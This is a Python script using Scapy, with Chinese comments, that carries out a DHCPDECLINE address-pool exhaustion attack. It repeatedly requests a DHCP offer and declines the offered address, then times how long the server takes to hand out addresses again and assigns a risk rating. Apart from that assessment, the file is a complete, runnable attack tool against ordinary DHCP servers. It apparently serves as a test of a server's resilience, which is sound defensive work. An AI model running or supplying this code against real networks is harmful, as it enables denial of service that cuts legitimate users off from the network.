from scapy.all import *
import logging
import random
import time
import sys

# --- Scapy 日志和输出配置 ---
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
conf.verb = 0

def test_dhcp_decline_attack(interface_name, num_attacks=5):
    """
    测试 DHCPDECLINE 攻击，尝试耗尽服务器地址池
    :param interface_name: 要使用的网络接口名称
    :param num_attacks: 尝试攻击的次数
    :return: 测试结果字典
    """
    print(f"[*] 开始在接口 {interface_name} 上进行 DHCPDECLINE 攻击测试...")
    print(f"[*] 将尝试拒绝 {num_attacks} 个IP地址。")
    
    socket = None
    try:
        mac_addr = get_if_hwaddr(interface_name)
        declined_ips = []
        
        # 初始化测试结果
        result = {
            "status": "成功",
            "declined_ips": [],
            "total_declined": 0,
            "address_pool_exhausted": False,
            "pool_exhaustion_percentage": 0,
            "server_recovery_time": "N/A",
        }
        
        # 创建套接字用于捕获响应
        socket = conf.L2listen(
            type=ETH_P_ALL,
            iface=interface_name,
            filter="udp and (port 67 or port 68)"
        )

        for i in range(num_attacks):
            xid = random.randint(1, 0xFFFFFFFF)
            print(f"\n--- 第 {i + 1}/{num_attacks} 轮 ---")

            # 1. 发送 DHCP Discover
            dhcp_discover = (
                Ether(src=mac_addr, dst="ff:ff:ff:ff:ff:ff") /
                IP(src="0.0.0.0", dst="255.255.255.255") /
                UDP(sport=68, dport=67) /
                BOOTP(chaddr=mac2str(mac_addr), xid=xid) /
                DHCP(options=[("message-type", "discover"), ("end")])
            )
            
            sendp(dhcp_discover, iface=interface_name, verbose=False)
            print("[+] 正在发送 DHCP Discover...")

            # 等待 DHCP Offer
            dhcp_offer = None
            start_time = time.time()
            while time.time() - start_time < 5:
                packets = socket.sniff(timeout=1, count=5)
                for pkt in packets:
                    if DHCP in pkt and BOOTP in pkt and pkt[BOOTP].xid == xid:
                        if any(opt[1] == 2 for opt in pkt[DHCP].options if opt[0] == 'message-type'):
                            dhcp_offer = pkt
                            break
                if dhcp_offer:
                    break

            if dhcp_offer is None:
                print("[!] 未收到 DHCP Offer，服务器可能无响应或地址池已空。")
                result["address_pool_exhausted"] = True
                break

            # 2. 从 Offer 包中提取信息
            offered_ip = dhcp_offer[BOOTP].yiaddr
            server_id = None
            for opt in dhcp_offer[DHCP].options:
                if opt[0] == 'server_id':
                    server_id = opt[1]
                    break
            
            if not server_id:
                print("[!] Offer 包中未找到 'server_id'，无法继续。")
                continue

            print(f"[*] 收到 Offer: IP 地址 {offered_ip} 来自服务器 {server_id}")

            # 3. 发送 DHCP Decline
            dhcp_decline = (
                Ether(src=mac_addr, dst="ff:ff:ff:ff:ff:ff") /
                IP(src="0.0.0.0", dst="255.255.255.255") /
                UDP(sport=68, dport=67) /
                BOOTP(chaddr=mac2str(mac_addr), xid=xid) /
                DHCP(options=[
                    ("message-type", "decline"),
                    ("server_id", server_id),
                    ("requested_addr", offered_ip), # 指明要拒绝哪个IP
                    ("end")
                ])
            )
            
            sendp(dhcp_decline, iface=interface_name, verbose=False)
            print(f"[+] 已发送 DHCP Decline 拒绝地址 {offered_ip}")
            declined_ips.append(offered_ip)
            result["declined_ips"].append(offered_ip)
            result["total_declined"] += 1
            time.sleep(0.5) # 短暂等待，避免网络风暴

        # 测试服务器恢复速度 - 尝试获取新IP
        if declined_ips:
            print("\n[*] 测试DHCP服务器恢复速度...")
            recovery_start = time.time()
            new_ip_obtained = False
            recovery_time = 0
            
            # 循环尝试最多60秒，看服务器是否能恢复
            for attempt in range(1, 13):  # 最多尝试12次，每次5秒
                print(f"[*] 恢复测试 #{attempt}，尝试获取新IP...")
                
                # 尝试正常的DHCP请求
                new_mac = "02:00:00:%02x:%02x:%02x" % (random.randint(0, 255), 
                                                       random.randint(0, 255), 
                                                       random.randint(0, 255))
                xid = random.randint(1, 0xFFFFFFFF)
                
                dhcp_discover = (
                    Ether(src=new_mac, dst="ff:ff:ff:ff:ff:ff") /
                    IP(src="0.0.0.0", dst="255.255.255.255") /
                    UDP(sport=68, dport=67) /
                    BOOTP(chaddr=mac2str(new_mac), xid=xid) /
                    DHCP(options=[("message-type", "discover"), ("end")])
                )
                
                sendp(dhcp_discover, iface=interface_name, verbose=False)
                
                # 等待响应
                dhcp_offer = None
                start_time = time.time()
                while time.time() - start_time < 5:
                    packets = socket.sniff(timeout=1, count=5)
                    for pkt in packets:
                        if DHCP in pkt and BOOTP in pkt and pkt[BOOTP].xid == xid:
                            if any(opt[1] == 2 for opt in pkt[DHCP].options if opt[0] == 'message-type'):
                                dhcp_offer = pkt
                                break
                    if dhcp_offer:
                        break
                
                if dhcp_offer:
                    new_ip_obtained = True
                    recovery_time = time.time() - recovery_start
                    print(f"[+] 服务器已恢复! 可以分配新的IP地址: {dhcp_offer[BOOTP].yiaddr}")
                    print(f"[+] 恢复时间: {recovery_time:.2f} 秒")
                    break
                else:
                    print(f"[!] 服务器还未恢复，等待5秒后再试...")
                    time.sleep(5)
            
            result["server_recovery_time"] = f"{recovery_time:.2f}秒" if new_ip_obtained else "超过60秒"
            result["exhaustion_level"] = calculate_exhaustion_level(result["total_declined"], 
                                                                   recovery_time)
            
            # 根据恢复时间和被拒绝的IP数量来评估安全风险
            if recovery_time > 60 or not new_ip_obtained:
                result["security_assessment"] = "高风险 - 服务器对DECLINE攻击非常敏感"
            elif recovery_time > 30:
                result["security_assessment"] = "中风险 - 服务器恢复较慢"
            elif recovery_time > 10:
                result["security_assessment"] = "低风险 - 服务器可以恢复，但有一定延迟"
            else:
                result["security_assessment"] = "安全 - 服务器快速恢复"

        print("\n[*] 测试完成。")
        print(f"[*] 共计拒绝了以下 IP 地址: {declined_ips}")
        
        return result

    except Exception as e:
        print(f"\n[!] 测试过程中发生异常: {e}")
        return {"status": "异常", "reason": str(e)}
    finally:
        if socket:
            socket.close()
            
def calculate_exhaustion_level(declined_count, recovery_time):
    """计算地址池耗尽程度评分（1-10分）"""
    # 基于拒绝的IP数量和恢复时间计算一个简单的评分
    # 得分越高，表示服务器对DECLINE攻击越敏感
    if recovery_time > 60:
        recovery_time = 60  # 设置上限
        
    # 拒绝IP数量得分(最高5分)
    ip_score = min(declined_count, 10) / 2
    
    # 恢复时间得分(最高5分) 
    time_score = min(recovery_time / 12, 5)  # 60秒满分，线性递减
    
    # 总分(最高10分)
    total_score = ip_score + time_score
    
    return round(total_score, 1)